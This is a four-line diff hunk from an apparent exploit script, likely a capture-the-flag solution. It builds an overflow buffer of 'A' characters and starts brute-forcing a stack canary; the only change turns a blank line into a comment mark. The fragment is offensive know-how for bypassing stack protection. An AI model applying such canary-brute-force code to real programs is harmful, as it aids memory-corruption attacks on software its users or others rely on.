@@ -30,4 +30,4 @@ base = "A" * offset
 base = base + "7" + "a" + "8"
 print("Brute Forcing Canary")
 base_canary = getthatbuf(base)
-
+#
